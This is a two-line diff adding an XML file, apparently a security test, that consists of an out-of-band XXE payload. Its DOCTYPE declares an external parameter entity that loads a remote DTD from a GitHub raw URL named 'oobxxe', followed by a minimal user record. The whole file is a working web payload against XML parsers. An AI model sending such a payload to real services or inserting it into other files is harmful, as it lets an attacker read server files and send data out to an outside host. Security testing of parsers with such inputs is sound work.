@@ -1,0 +1,2 @@
+<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://raw.githubusercontent.com/PetrusViet/testYouTrack/main/oobxxe" > %xxe;]>
+<user><id_user>1</id_user></user>
